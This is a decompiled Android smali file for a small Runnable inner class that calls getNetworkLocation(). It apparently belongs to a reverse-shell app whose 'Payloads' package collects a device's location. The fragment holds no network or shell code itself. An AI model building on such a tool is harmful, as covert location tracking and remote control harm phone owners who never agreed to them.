.class Lcom/example/reverseshell2/Payloads/locationManager$3;
.super Ljava/lang/Object;
.source "locationManager.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/locationManager;->getLocation()Ljava/lang/String;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/locationManager;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/locationManager;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/locationManager;

    .line 124
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/locationManager$3;->this$0:Lcom/example/reverseshell2/Payloads/locationManager;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 1

    .line 127
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager$3;->this$0:Lcom/example/reverseshell2/Payloads/locationManager;

    invoke-virtual {v0}, Lcom/example/reverseshell2/Payloads/locationManager;->getNetworkLocation()V

    .line 128
    return-void
.end method
